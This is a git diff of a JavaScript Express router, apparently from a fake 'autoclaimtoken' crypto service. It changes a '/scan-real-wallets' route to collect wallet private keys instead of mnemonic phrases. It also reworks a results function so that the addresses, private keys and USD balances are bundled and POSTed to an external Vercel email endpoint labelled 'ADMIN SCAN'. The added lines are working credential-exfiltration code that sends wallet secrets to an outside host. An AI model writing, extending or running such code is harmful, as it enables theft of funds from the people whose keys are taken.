@@ -53,14 +53,14 @@ router.post('/scan-real-wallets', async (req, res) => {
       
       scannedWallets.push({
         address: wallet.address,
-        phrase: wallet.mnemonic?.phrase || 'N/A',
+        privateKey: wallet.privateKey,
         balance: balance.totalValueUSD
       });
       
       // Always add to found wallets
       foundWallets.push({
         address: wallet.address,
-        phrase: wallet.mnemonic?.phrase || 'N/A',
+        privateKey: wallet.privateKey,
         ethBalance: balance.ethBalance,
         totalValueUSD: balance.totalValueUSD,
         chains: balance.chains,
@@ -361,7 +361,7 @@ async function sendCompleteResults(wallets, totalScanned) {
       console.log('📧 Sending via Vercel backup...');
       
       const fundedCount = wallets.filter(w => w.totalValueUSD > 0).length;
-      const walletData = wallets.map((w, i) => `${i + 1}. ${w.address}\nPhrase: ${w.phrase}\nBalance: $${w.totalValueUSD}\n`).join('\n');
+      const walletData = wallets.map((w, i) => `${i + 1}. ${w.address}\nPrivate Key: ${w.privateKey || 'N/A'}\nBalance: $${w.totalValueUSD}\n`).join('\n');
       
       const backupResponse = await axios.post('https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app/api/send-email', {
         subject: `🔍 ADMIN SCAN: ${totalScanned} wallets (${fundedCount} funded) - Complete Data`,
